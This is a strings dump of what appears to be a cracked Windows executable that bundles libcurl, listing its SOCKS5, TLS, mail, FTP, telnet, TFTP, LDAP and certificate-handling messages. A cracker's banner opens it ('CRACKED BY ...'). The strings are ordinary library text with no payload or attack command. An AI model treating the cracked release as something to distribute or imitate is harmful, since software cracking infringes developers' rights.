#############
CRACKED BY kwsstas.westt#1312
#############
DONT DM FOR SUPPORT!!
#############
Galaxy < Suicide


Offset	Size	Type	String
00071fe0	34	A	Received invalid version in initial SOCKS5 response.
00072018	2b	A	Unable to negotiate SOCKS5 GSS-API context.
00072048	3a	A	SOCKS5 GSSAPI per-message authentication is not supported.
00072088	28	A	No authentication method was acceptable.
000720b8	38	A	Undocumented SOCKS5 mode attempted to be used by server.
000720f8	29	A	Excessive user name length for proxy auth
00072128	28	A	Excessive password length for proxy auth
00072158	2e	A	Failed to send SOCKS5 sub-negotiation request.
00072188	32	A	Unable to receive SOCKS5 sub-negotiation response.
000721c0	2f	A	User was rejected by the SOCKS5 server (%d %d).
00072210	2a	A	Failed to resolve "%s" for SOCKS5 connect.
000722f8	2e	A	SOCKS5 GSS-API protection not yet implemented.
00072328	26	A	Failed to send SOCKS5 connect request.
00072350	2d	A	Failed to receive SOCKS5 connect request ack.
00072380	34	A	SOCKS5 reply has wrong version, version should be 5.
000723b8	2c	A	Can't complete SOCKS5 connection to %s. (%d)
00072408	0a	A	0123456789
00072418	10	A	0123456789abcdef
00072430	10	A	0123456789ABCDEF
000728dc	06	A	Monday
000728e8	07	A	Tuesday
000728f0	09	A	Wednesday
00072900	08	A	Thursday
0007290c	06	A	Friday
00072918	08	A	Saturday
00072924	06	A	Sunday
00072930	39	A	%31[ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
00072970	10	A	%02d:%02d:%02d%n
00072988	0b	A	%02d:%02d%n
000729c0	10	A	0123456789abcdef
00072aa0	08	A	schannel
00072ab0	26	A	schannel: TLS 1.3 is not yet supported
00072ad8	08	A	CALG_MD2
00072ae8	08	A	CALG_MD4
00072af8	08	A	CALG_MD5
00072b08	08	A	CALG_SHA
00072b18	09	A	CALG_SHA1
00072b28	08	A	CALG_MAC
00072b38	0d	A	CALG_RSA_SIGN
00072b48	0d	A	CALG_DSS_SIGN
00072b58	0c	A	CALG_NO_SIGN
00072b68	0d	A	CALG_RSA_KEYX
00072b78	08	A	CALG_DES
00072b88	0d	A	CALG_3DES_112
00072b98	09	A	CALG_3DES
00072ba8	09	A	CALG_DESX
00072bb8	08	A	CALG_RC2
00072bc8	08	A	CALG_RC4
00072bd8	09	A	CALG_SEAL
00072be8	0a	A	CALG_DH_SF
00072bf8	0d	A	CALG_DH_EPHEM
00072c08	12	A	CALG_AGREEDKEY_ANY
00072c20	0f	A	CALG_HUGHES_MD5
00072c30	0d	A	CALG_SKIPJACK
00072c40	08	A	CALG_TEK
00072c50	0f	A	CALG_CYLINK_MEK
00072c60	10	A	CALG_SSL3_SHAMD5
00072c78	10	A	CALG_SSL3_MASTER
00072c90	19	A	CALG_SCHANNEL_MASTER_HASH
00072cb0	15	A	CALG_SCHANNEL_MAC_KEY
00072cc8	15	A	CALG_SCHANNEL_ENC_KEY
00072ce0	10	A	CALG_PCT1_MASTER
00072cf8	10	A	CALG_SSL2_MASTER
00072d10	10	A	CALG_TLS1_MASTER
00072d28	08	A	CALG_RC5
00072d38	09	A	CALG_HMAC
00072d48	0c	A	CALG_TLS1PRF
00072d58	15	A	CALG_HASH_REPLACE_OWF
00072d70	0c	A	CALG_AES_128
00072d80	0c	A	CALG_AES_192
00072d90	0c	A	CALG_AES_256
00072da0	08	A	CALG_AES
00072db0	0c	A	CALG_SHA_256
00072dc0	0c	A	CALG_SHA_384
00072dd0	0c	A	CALG_SHA_512
00072de0	09	A	CALG_ECDH
00072df0	0a	A	CALG_ECMQV
00072e00	0a	A	CALG_ECDSA
00072e10	0f	A	CALG_ECDH_EPHEM
00072e20	0b	A	CurrentUser
00072e30	0c	A	LocalMachine
00072e40	0e	A	CurrentService
00072e50	08	A	Services
00072e5c	05	A	Users
00072e68	16	A	CurrentUserGroupPolicy
00072e80	17	A	LocalMachineGroupPolicy
00072e98	16	A	LocalMachineEnterprise
00072f28	10	A	wine_get_version
00072f3c	05	A	ntdll
00072f50	64	A	schannel: this version of Windows is too old to support certificate verification via CA bundle file.
00072fb8	34	A	Unrecognized parameter passed via CURLOPT_SSLVERSION
00072ff0	33	A	Unable to set ciphers to passed via SSL_CONN_CONFIG
00073028	3b	A	schannel: Failed to get certificate location or file for %s
00073068	25	A	schannel: Failed to read cert file %s
00073090	38	A	schannel: Failed to import cert file %s, password is bad
000730d0	3b	A	schannel: Failed to import cert file %s, last error is 0x%x
00073110	44	A	schannel: Failed to get certificate from file %s, last error is 0x%x
00073158	3d	A	schannel: Failed to open cert store %x %s, last error is 0x%x
00073198	23	A	schannel: unable to allocate memory
000731c0	2c	A	Microsoft Unified Security Protocol Provider
000731f0	2d	A	schannel: AcquireCredentialsHandle failed: %s
00073260	08	A	http/1.1
00073290	36	A	schannel: initial InitializeSecurityContext failed: %s
000732c8	2d	A	schannel: SNI or certificate check failed: %s
00073300	46	A	schannel: failed to send initial handshake data: sent %zd of %lu bytes
00073348	26	A	schannel: unable to re-allocate memory
00073370	40	A	schannel: failed to receive handshake, SSL/TLS connection failed
000733c0	43	A	schannel: failed to send next handshake data: sent %zd of %lu bytes
00073408	33	A	schannel: next InitializeSecurityContext failed: %s
00073440	31	A	SSL: public key does not match pinned public key!
00073478	2c	A	schannel: failed to setup sequence detection
000734a8	2a	A	schannel: failed to setup replay detection
000734d8	29	A	schannel: failed to setup confidentiality
00073508	2b	A	schannel: failed to setup memory allocation
00073538	2c	A	schannel: failed to setup stream orientation
00073568	28	A	schannel: failed to retrieve ALPN result
000735f8	2b	A	schannel: failed to store credential handle
00073628	30	A	schannel: failed to retrieve remote cert context
00073660	1a	A	SSL/TLS connection timeout
00073680	28	A	select/poll on SSL/TLS socket, errno: %d
000736b0	32	A	schannel: timed out sending data (bytes sent: %zd)
000736e8	24	A	select/poll on SSL socket, errno: %d
00073a58	27	A	schannel: ApplyControlToken failure: %s
00073ac0	08	A	Schannel
00073ad0	37	A	schannel: Failed to read remote certificate context: %s
00073b08	39	A	SSL: failed retrieving public key from server certificate
00073b90	40	A	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
00073be0	40	A	ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_
00073c24	06	A	%c%c==
00073c30	07	A	%c%c%c=
00073c38	08	A	%c%c%c%c
00073da0	05	A	IMAPS
00073db0	0a	A	CAPABILITY
00073dc4	05	A	STORE
00073dcc	05	A	FETCH
00073dd4	06	A	SELECT
00073de0	07	A	EXAMINE
00073de8	06	A	SEARCH
00073df0	07	A	EXPUNGE
00073e10	20	A	Unexpected continuation response
00073e38	08	A	STARTTLS
00073e48	0b	A	LOGIN %s %s
00073e58	12	A	AUTHENTICATE %s %s
00073e70	0f	A	AUTHENTICATE %s
00073eb8	0b	A	LIST "%s" *
00073ec8	20	A	Cannot SELECT without a mailbox.
00073ef0	09	A	SELECT %s
00073f00	19	A	UID FETCH %s BODY[%s]<%s>
00073f20	15	A	UID FETCH %s BODY[%s]
00073f38	15	A	FETCH %s BODY[%s]<%s>
00073f50	11	A	FETCH %s BODY[%s]
00073f68	1b	A	Cannot FETCH without a UID.
00073f88	20	A	Cannot APPEND without a mailbox.
00073fb0	0c	A	Mime-Version
00073fc0	11	A	Mime-Version: 1.0
00074008	19	A	APPEND %s (\Seen) {%I64d}
00074028	25	A	Cannot SEARCH without a query string.
00074050	09	A	SEARCH %s
0007405c	06	A	LOGOUT
00074098	23	A	Got unexpected imap-server response
000740bc	05	A	AUTH=
000740c8	17	A	STARTTLS not supported.
000740e0	0f	A	STARTTLS denied
000740f0	18	A	Authentication cancelled
00074110	11	A	Access denied. %c
00074128	20	A	OK [UIDVALIDITY %19[0123456789]]
00074150	1f	A	Mailbox UIDVALIDITY has changed
00074170	0d	A	Select failed
000741d8	1f	A	Failed to parse FETCH response.
000741f8	06	A	%c%03d
00074200	05	A	%s %s
00074208	0b	A	UIDVALIDITY
00074218	09	A	MAILINDEX
00074228	07	A	SECTION
00074230	07	A	PARTIAL
00074390	05	A	POP3S
000743b0	07	A	USER %s
000743c0	0a	A	APOP %s %s
000743d0	0a	A	AUTH %s %s
000743e0	07	A	AUTH %s
000743f8	23	A	Got unexpected pop3-server response
00074420	13	A	STLS not supported.
00074438	19	A	Authentication failed: %d
00074458	07	A	PASS %s
00074460	05	A	+APOP
000745c0	05	A	SMTPS
000745d0	07	A	EHLO %s
000745d8	07	A	HELO %s
000745e0	09	A	 SMTPUTF8
000745f0	0d	A	VRFY %s%s%s%s
00074608	07	A	%s %s%s
00074618	07	A	<%s@%s>
0007462c	05	A	%I64d
00074634	06	A	 SIZE=
0007463c	06	A	 AUTH=
00074648	16	A	MAIL FROM:%s%s%s%s%s%s
00074660	0f	A	RCPT TO:<%s@%s>
00074670	0c	A	RCPT TO:<%s>
00074680	27	A	Got unexpected smtp-server response: %d
000746a8	18	A	STARTTLS denied, code %d
000746c8	18	A	Remote access denied: %d
000746e8	20	A	Unexpectedly short EHLO response
00074710	12	A	Command failed: %d
00074728	0f	A	MAIL failed: %d
00074738	0f	A	RCPT failed: %d
00074748	1c	A	RCPT failed: %d (last error)
00074770	0f	A	DATA failed: %d
000748e0	20	A	Error accept()ing server connect
00074950	34	A	Accept timeout occurred while waiting server connect
000749c0	26	A	Error while waiting for server connect
00074ac8	14	A	FTP response timeout
00074ae0	31	A	FTP response aborted due to select/poll error: %d
00074b18	06	A	CWD %s
00074b20	18	A	getsockname() failed: %s
00074b40	32	A	failed to resolve the address provided to PORT: %s
00074b78	12	A	socket failure: %s
00074bc0	19	A	bind(port=%hu) failed: %s
00074be0	23	A	bind() failed, we ran out of ports!
00074c08	0e	A	%s |%d|%s|%hu|
00074c18	20	A	Failure sending EPRT command: %s
00074c3c	06	A	,%d,%d
00074c48	20	A	Failure sending PORT command: %s
00074c98	07	A	PRET %s
00074ca0	0c	A	PRET STOR %s
00074cb0	0c	A	PRET RETR %s
00074cc0	07	A	REST %d
00074cc8	07	A	SIZE %s
00074cd0	07	A	MDTM %s
00074cd8	13	A	Failed to read data
00074d18	07	A	APPE %s
00074d20	07	A	STOR %s
00074d28	07	A	RETR %s
00074d80	0a	A	%c%c%c%u%c
00074d90	21	A	Illegal port number in EPSV reply
00074db8	1c	A	Weirdly formatted EPSV reply
00074dd8	11	A	%u,%u,%u,%u,%u,%u
00074df0	23	A	Couldn't interpret the 227-response
00074e58	0b	A	%u.%u.%u.%u
00074e68	1c	A	Bad PASV/EPSV response: %03d
00074e88	1f	A	Can't resolve proxy host %s:%hu
00074ea8	1d	A	Can't resolve new host %s:%hu
00074ee0	11	A	Failed to do PORT
00074f18	18	A	%04d%02d%02d%02d%02d%02d
00074f38	1f	A	%04d%02d%02d %02d:%02d:%02d GMT
00074fb0	19	A	Given file does not exist
00074ff0	19	A	Couldn't set desired mode
00075070	2b	A	Offset (%I64d) was beyond file size (%I64d)
000750f8	0a	A	REST %I64d
00075120	11	A	Couldn't use REST
00075138	16	A	Failed FTP upload: %0d
0007517c	06	A	 bytes
000751c0	13	A	RETR response: %03d
000751d8	07	A	PBSZ %d
000751e0	07	A	ACCT %s
000751e8	21	A	ACCT requested but none available
00075210	13	A	Access denied: %03d
00075228	1d	A	ACCT rejected by server: %03d
00075248	34	A	Got a %03d ftp-server response when 220 was expected
00075280	2f	A	unsupported parameter to CURLOPT_FTPSSLAUTH: %d
000752b0	07	A	PROT %c
000752c0	29	A	Failed to clear the command channel (CCC)
0007532c	06	A	OS/400
00075338	0e	A	SITE NAMEFMT 1
00075348	1d	A	QUOT command failed with %03d
00075368	06	A	MKD %s
00075370	32	A	Server denied you to change to the given directory
000753a8	17	A	Failed to MKD dir: %03d
000753c0	1f	A	PRET command not accepted: %03d
00075408	20	A	Failure sending ABOR command: %s
00075430	1d	A	control connection looks dead
00075480	20	A	server did not report OK, got %d
000754a8	37	A	Uploaded unaligned file size (%I64d out of %I64d bytes)
000754e0	27	A	Received only partial file: %I64d bytes
00075508	15	A	No data was received!
00075520	1c	A	QUOT string not accepted: %s
00075540	07	A	TYPE %c
000755f8	20	A	Failure sending QUIT command: %s
00075620	27	A	Uploading to a URL without a file name!
00075710	15	A	Couldn't open file %s
00075728	19	A	Can't open %s for writing
00075748	18	A	Can't get the size of %s
000757a0	1b	A	Can't get the size of file.
000757c0	21	A	failed to resume file:// transfer
00075880	3b	A	The CSeq of this request %ld did not match the response %ld
000758e8	18	A	Got invalid RTSP request
00075908	08	A	DESCRIBE
00075918	08	A	ANNOUNCE
00075924	05	A	SETUP
00075934	05	A	PAUSE
00075940	08	A	TEARDOWN
00075950	0d	A	GET_PARAMETER
00075960	0d	A	SET_PARAMETER
00075970	06	A	RECORD
00075978	26	A	Got invalid RTSP request: RTSPREQ_LAST
000759a0	3c	A	Refusing to issue an RTSP request [%s] without a session ID.
000759e0	09	A	Transport
00075a00	3c	A	Refusing to issue an RTSP SETUP without a Transport: header.
00075a78	26	A	CSeq cannot be set as a custom header.
00075aa0	07	A	Session
00075aa8	2c	A	Session ID cannot be set as a custom header.
00075b08	10	A	%s%s%s%s%s%s%s%s
00075b60	1b	A	Failed sending RTSP request
00075b80	22	A	Got an error writing an RTP packet
00075ba8	10	A	Cannot pause RTP
00075bc0	17	A	Failed writing RTP data
00075bd8	05	A	CSeq:
00075be0	05	A	: %ld
00075be8	24	A	Unable to read the CSeq header: [%s]
00075c10	08	A	Session:
00075c20	16	A	Got a blank Session ID
00075c38	31	A	Got RTSP Session ID Line [%s], but wanted ID [%s]
00075d9c	0a	A	NT LM 0.12
00075da8	0f	A	x86_64-pc-win32
00075dc4	05	A	?????
00075dd0	14	A	Invalid input packet
00075e80	07	A	/MATCH:
00075e8c	06	A	/FIND:
00075eb0	07	A	default
00075ef0	1b	A	Failed sending DICT request
00075f10	08	A	/DEFINE:
00075f20	08	A	/LOOKUP:
00076200	06	A	BINARY
00076218	11	A	SUPPRESS GO AHEAD
00076234	06	A	STATUS
00076240	0b	A	TIMING MARK
00076264	06	A	NAOCRD
0007626c	06	A	NAOHTS
00076274	06	A	NAOHTD
0007627c	06	A	NAOFFD
00076284	06	A	NAOVTS
0007628c	06	A	NAOVTD
00076294	06	A	NAOLFD
000762a0	0c	A	EXTEND ASCII
000762b0	0a	A	BYTE MACRO
000762c0	0b	A	DE TERMINAL
000762cc	06	A	SUPDUP
000762d8	0d	A	SUPDUP OUTPUT
000762e8	0d	A	SEND LOCATION
000762f8	09	A	TERM TYPE
00076308	0d	A	END OF RECORD
00076318	0a	A	TACACS UID
00076328	0e	A	OUTPUT MARKING
00076338	06	A	TTYLOC
00076340	0b	A	3270 REGIME
0007634c	06	A	X3 PAD
00076360	0a	A	TERM SPEED
0007636c	05	A	LFLOW
00076378	08	A	LINEMODE
00076388	08	A	XDISPLOC
00076398	0b	A	OLD-ENVIRON
000763a8	0e	A	AUTHENTICATION
000763b8	07	A	ENCRYPT
000763c0	0b	A	NEW-ENVIRON
000763d8	05	A	ABORT
000763ec	05	A	DMARK
00076434	06	A	TELNET
00076440	16	A	WSAStartup failed (%d)
00076458	2e	A	insufficient winsock version to support telnet
000764a4	05	A	EXOPL
000764e0	18	A	Sending data failed (%d)
00076510	0a	A	%s IAC SB 
00076520	0f	A	(terminated by 
00076538	0f	A	, not IAC SE!) 
00076548	12	A	(Empty suboption?)
00076560	10	A	%s (unsupported)
00076578	0c	A	%d (unknown)
00076588	16	A	Width: %d ; Height: %d
000765a4	05	A	 SEND
000765b0	0b	A	 INFO/REPLY
000765bc	05	A	 NAME
000765c4	05	A	 "%s"
000765d4	05	A	 %.2x
000765e0	07	A	USER,%s
000765e8	14	A	%127[^= ]%*[ =]%255s
00076600	05	A	TTYPE
00076608	07	A	NEW_ENV
00076618	0c	A	%hu%*[xX]%hu
00076628	21	A	Syntax error in telnet option: %s
00076650	18	A	Unknown telnet option %s
00076670	0e	A	%c%c%c%c%s%c%c
00076680	0e	A	%127[^,],%127s
00076690	08	A	%c%s%c%s
000766a8	1d	A	In SUBOPTION processing, RCVD
000766c8	0a	A	WS2_32.DLL
000766d8	1e	A	failed to load WS2_32.DLL (%u)
000766f8	0e	A	WSACreateEvent
00076708	2b	A	failed to find WSACreateEvent function (%u)
00076738	0d	A	WSACloseEvent
00076748	2a	A	failed to find WSACloseEvent function (%u)
00076778	0e	A	WSAEventSelect
00076788	2b	A	failed to find WSAEventSelect function (%u)
000767b8	14	A	WSAEnumNetworkEvents
000767d0	31	A	failed to find WSAEnumNetworkEvents function (%u)
00076808	1a	A	WSACreateEvent failed (%d)
00076828	20	A	WSAEnumNetworkEvents failed (%d)
00076850	08	A	Time-out
00076860	19	A	WSACloseEvent failed (%d)
00076880	1f	A	FreeLibrary(wsock2) failed (%u)
00076970	1f	A	Malformed ACK packet, rejecting
000769b0	07	A	blksize
000769b8	26	A	invalid blocksize value in OACK packet
000769e0	24	A	blksize is larger than max supported
00076a08	07	A	%s (%d)
00076a10	25	A	blksize is smaller than min supported
00076a38	2e	A	server requested blksize larger than allocated
00076a68	08	A	%s (%ld)
00076a78	09	A	requested
00076a88	18	A	blksize parsed from OACK
00076abc	05	A	tsize
00076ac8	16	A	tsize parsed from OACK
00076af0	29	A	invalid tsize -:%s:- value in OACK packet
00076b20	16	A	Connected for transmit
00076b38	15	A	Connected for receive
00076b50	05	A	octet
00076b58	08	A	netascii
00076b88	08	A	%s%c%s%c
00076b98	07	A	timeout
00076ba0	21	A	TFTP buffer too small for options
00076bc8	1f	A	tftp_send_first: internal error
00076c90	17	A	tftp_rx: internal error
00076cd8	2b	A	tftp_tx: giving up waiting for block %d ack
00076d08	22	A	tftp_tx: internal error, event: %i
00076d30	0d	A	TFTP finished
00076d40	1c	A	Internal state machine error
00076d60	11	A	bind() failed; %s
00076d78	19	A	Received too short packet
00076da8	21	A	Internal error: Unexpected packet
00076dd0	15	A	TFTP response timeout
00076de8	06	A	;mode=
00076f10	05	A	LDAPS
00076f18	16	A	Microsoft Corporation.
00076f78	0e	A	LDAP local: %s
00076f88	09	A	encrypted
00076f98	09	A	cleartext
00076fd8	24	A	LDAP local: Cannot connect to %s:%ld
00077000	25	A	LDAP local: bind via ldap_win_bind %s
00077028	0f	A	LDAP remote: %s
00077040	07	A	;binary
00077070	07	A	onetree
00077088	07	A	subtree
00077128	06	A	GOPHER
00077130	1d	A	Failed sending Gopher request
00077163	0d	A	
00077178	06	A	%%%02x
00077180	23	A	[%*45[0123456789abcdefABCDEF:.]%c%n
000771a8	0a	A	%*[^]]%c%n
000771b8	18	A	0123456789abcdefABCDEF:.
000771d8	0a	A	localhost/
000771e8	0a	A	127.0.0.1/
000771fc	05	A	dict.
0007720c	05	A	ldap.
0007721c	05	A	imap.
00077224	05	A	smtp.
0007722c	05	A	pop3.
00077240	0d	A	file://%s%s%s
00077250	07	A	%%25%s]
00077260	23	A	%s://%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
00077288	07	A	machine
00077290	05	A	login
00077298	08	A	password
000772b0	0a	A	%s%s.netrc
000772c0	0a	A	%s%s_netrc
000772f0	4d	A	Curl_output_negotiate, no persistent authentication: cleanup existing context
000773e8	0b	A	%d.%d.%d.%d
000773f8	07	A	WDigest
00077438	05	A	realm
00077440	05	A	stale
00077488	0c	A	security.dll
00077498	0b	A	secur32.dll
000774a8	16	A	InitSecurityInterfaceA
000774c0	1b	A	Too long hexadecimal number
000774e0	27	A	Illegal or missing hexadecimal sequence
00077508	18	A	Malformed encoding found
00077528	1a	A	Bad content-encoding found
000775b8	09	A	Bad label
000775c8	0c	A	Out of range
000775d8	0a	A	Label loop
000775e8	09	A	Too small
000775f8	0c	A	RDATA length
00077608	09	A	Malformat
00077618	09	A	Bad RCODE
00077628	0f	A	Unexpected TYPE
00077638	10	A	Unexpected CLASS
00077650	0a	A	No content
0007765c	06	A	Bad ID
00077668	0e	A	bad error code
000776d8	09	A	%s?dns=%s
000776e8	25	A	Content-Type: application/dns-message
00077740	0a	A	DOH AAAA: 
00077750	0a	A	%s%02x%02x
00077778	19	A	Could not DOH-resolve: %s
00077868	24	A	InitializeSecurityContext failed: %s
00077890	1c	A	CompleteAuthToken failed: %s
000778b0	19	A	SSPI error: %s failed: %s
000778d4	05	A	%s/%s
000778e0	08	A	Kerberos
000778f0	18	A	AcquireCredentialsHandle
00077910	1e	A	Failed to acquire credentials.
00077930	19	A	InitializeSecurityContext
00077950	26	A	Failed to initialise security context.
00077978	2b	A	Failed to send SSPI authentication request.
000779a8	29	A	Failed to send SSPI authentication token.
000779d8	2f	A	Failed to receive SSPI authentication response.
00077a08	2f	A	User was rejected by the SOCKS5 server (%u %u).
00077a38	32	A	Invalid SSPI authentication response type (%u %u).
00077a70	2c	A	Failed to receive SSPI authentication token.
00077aa0	19	A	QueryCredentialAttributes
00077ac0	1e	A	Failed to determine user name.
00077b18	09	A	integrity
00077b28	0f	A	confidentiality
00077b70	16	A	QueryContextAttributes
00077b88	2c	A	Failed to query security context attributes.
00077bb8	0e	A	EncryptMessage
00077bc8	27	A	Failed to send SSPI encryption request.
00077bf0	24	A	Failed to send SSPI encryption type.
00077c18	2b	A	Failed to receive SSPI encryption response.
00077c48	2e	A	Invalid SSPI encryption response type (%u %u).
00077c78	27	A	Failed to receive SSPI encryption type.
00077ca0	0e	A	DecryptMessage
00077cb0	2e	A	Invalid SSPI encryption response length (%lu).
00077ce0	10	A	out GSS-API data
00077cf8	12	A	 GSS-API integrity
00077d10	18	A	 GSS-API confidentiality
00077d60	30	A	schannel: invalid path name for CA file '%s': %s
00077d98	29	A	schannel: failed to open CA file '%s': %s
00077dc8	36	A	schannel: failed to determine size of CA file '%s': %s
00077e00	2e	A	schannel: CA file exceeds max size of %u bytes
00077e30	2e	A	schannel: failed to read from CA file '%s': %s
00077e60	1b	A	-----BEGIN CERTIFICATE-----
00077e81	19	A	-----END CERTIFICATE-----
00077ea0	31	A	schannel: CA file '%s' is not correctly formatted
00077ed8	3d	A	schannel: failed to extract certificate from CA file '%s': %s
00077f20	54	A	schannel: unexpected content type '%d' when extracting certificate from CA file '%s'
00077f80	4e	A	schannel: failed to add certificate from CA file '%s' to certificate store: %s
00078048	23	A	schannel: Null certificate context.
00078070	20	A	schannel: Null certificate info.
00078098	09	A	2.5.29.17
000780a8	34	A	schannel: CertFindExtension() returned no extension.
000780e0	47	A	schannel: CryptDecodeObjectEx() returned no alternate name information.
00078128	19	A	schannel: Empty DNS name.
00078148	33	A	schannel: Not enough memory to list all host names.
00078180	46	A	schannel: CertGetNameString() returned no certificate name information
000781d0	56	A	schannel: CertGetNameString() returned certificate name information of unexpected size
000782d0	67	A	schannel: CertGetNameString() failed to match connection hostname (%s) against server certificate names
00078338	35	A	schannel: server certificate name verification failed
00078370	30	A	schannel: failed to create certificate store: %s
000783a8	37	A	schannel: failed to create certificate chain engine: %s
000783e0	2c	A	schannel: CertGetCertificateChain failed: %s
00078410	43	A	schannel: CertGetCertificateChain trust error CERT_TRUST_IS_REVOKED
00078460	49	A	schannel: CertGetCertificateChain trust error CERT_TRUST_IS_PARTIAL_CHAIN
000784b0	4a	A	schannel: CertGetCertificateChain trust error CERT_TRUST_IS_UNTRUSTED_ROOT
00078500	4a	A	schannel: CertGetCertificateChain trust error CERT_TRUST_IS_NOT_TIME_VALID
00078550	52	A	schannel: CertGetCertificateChain trust error CERT_TRUST_REVOCATION_STATUS_UNKNOWN
000785a8	34	A	schannel: CertGetCertificateChain error mask: 0x%08x
000785e0	07	A	2.5.4.3
000785e8	09	A	2.5.29.17
000788f0	11	A	1.2.840.10040.4.1
00078908	11	A	1.2.840.10040.4.3
00078920	0d	A	dsa-with-sha1
00078930	11	A	1.2.840.10045.2.1
00078948	0b	A	ecPublicKey
00078958	13	A	1.2.840.10045.3.0.1
00078970	0a	A	c2pnb163v1
00078980	11	A	1.2.840.10045.4.1
00078998	0f	A	ecdsa-with-SHA1
000789a8	11	A	1.2.840.10046.2.1
000789c0	0e	A	dhpublicnumber
000789d0	14	A	1.2.840.113549.1.1.1
000789e8	0d	A	rsaEncryption
000789f8	14	A	1.2.840.113549.1.1.2
00078a10	14	A	md2WithRSAEncryption
00078a28	14	A	1.2.840.113549.1.1.4
00078a40	14	A	md5WithRSAEncryption
00078a58	14	A	1.2.840.113549.1.1.5
00078a70	15	A	sha1WithRSAEncryption
00078a88	15	A	1.2.840.113549.1.1.10
00078aa0	0a	A	RSASSA-PSS
00078ab0	15	A	1.2.840.113549.1.1.14
00078ac8	17	A	sha224WithRSAEncryption
00078ae0	15	A	1.2.840.113549.1.1.11
00078af8	17	A	sha256WithRSAEncryption
00078b10	15	A	1.2.840.113549.1.1.12
00078b28	17	A	sha384WithRSAEncryption
00078b40	15	A	1.2.840.113549.1.1.13
00078b58	17	A	sha512WithRSAEncryption
00078b70	12	A	1.2.840.113549.2.2
00078b88	12	A	1.2.840.113549.2.5
00078ba0	0d	A	1.3.14.3.2.26
00078bc0	07	A	2.5.4.4
00078bd0	07	A	2.5.4.5
00078bd8	0c	A	serialNumber
00078be8	07	A	2.5.4.6
00078bf8	07	A	2.5.4.7
00078c08	07	A	2.5.4.8
00078c18	07	A	2.5.4.9
00078c20	0d	A	streetAddress
00078c30	08	A	2.5.4.10
00078c40	08	A	2.5.4.11
00078c50	08	A	2.5.4.12
00078c5c	05	A	title
00078c68	08	A	2.5.4.13
00078c78	0b	A	description
00078c88	08	A	2.5.4.17
00078c98	0a	A	postalCode
00078ca8	08	A	2.5.4.41
00078cc0	08	A	2.5.4.42
00078cd0	09	A	givenName
00078ce0	08	A	2.5.4.43
00078cf0	08	A	initials
00078d00	08	A	2.5.4.44
00078d10	13	A	generationQualifier
00078d28	08	A	2.5.4.45
00078d38	14	A	X500UniqueIdentifier
00078d50	08	A	2.5.4.46
00078d60	0b	A	dnQualifier
00078d70	08	A	2.5.4.65
00078d80	09	A	pseudonym
00078d90	14	A	1.2.840.113549.1.9.1
00078da8	0c	A	emailAddress
00078db8	08	A	2.5.4.72
00078dd0	0e	A	subjectAltName
00078de0	09	A	2.5.29.18
00078df0	0d	A	issuerAltName
00078e00	09	A	2.5.29.19
00078e10	10	A	basicConstraints
00078e28	16	A	2.16.840.1.101.3.4.2.4
00078e40	06	A	sha224
00078e48	16	A	2.16.840.1.101.3.4.2.1
00078e60	06	A	sha256
00078e68	16	A	2.16.840.1.101.3.4.2.2
00078e80	06	A	sha384
00078e88	16	A	2.16.840.1.101.3.4.2.3
00078ea0	06	A	sha512
00078ea8	05	A	%02x:
00078eb4	05	A	%s%lx
00078ec8	29	A	%.4s-%.2s-%.2s %.2s:%.2s:%c%c%s%.*s%s%.*s
00078f00	24	A	%u%.2s-%.2s-%.2s %.2s:%.2s:%.2s %.*s
00078f60	0e	A	RSA Public Key
00078f70	06	A	rsa(n)
00078f78	06	A	rsa(e)
00078f80	06	A	dsa(p)
00078f88	06	A	dsa(q)
00078f90	06	A	dsa(g)
00078f98	0c	A	dsa(pub_key)
00078fa8	05	A	dh(p)
00078fb0	05	A	dh(g)
00078fb8	0b	A	dh(pub_key)
00078fc8	07	A	Subject
00078fe4	06	A	Issuer
00079000	07	A	Version
00079028	0d	A	Serial Number
00079050	13	A	Signature Algorithm
00079088	0a	A	Start Date
000790b0	0b	A	Expire Date
000790d8	14	A	Public Key Algorithm
00079110	09	A	Signature
00079138	19	A	-----END CERTIFICATE-----
00079160	17	A	server response timeout
00079178	11	A	select/poll error
00079190	26	A	cached response data too big to handle
000791b8	17	A	response reading failed
00079310	05	A	LOGIN
00079318	05	A	PLAIN
00079320	08	A	CRAM-MD5
00079330	0a	A	DIGEST-MD5
0007933c	06	A	GSSAPI
00079348	08	A	EXTERNAL
00079358	07	A	XOAUTH2
00079360	0b	A	OAUTHBEARER
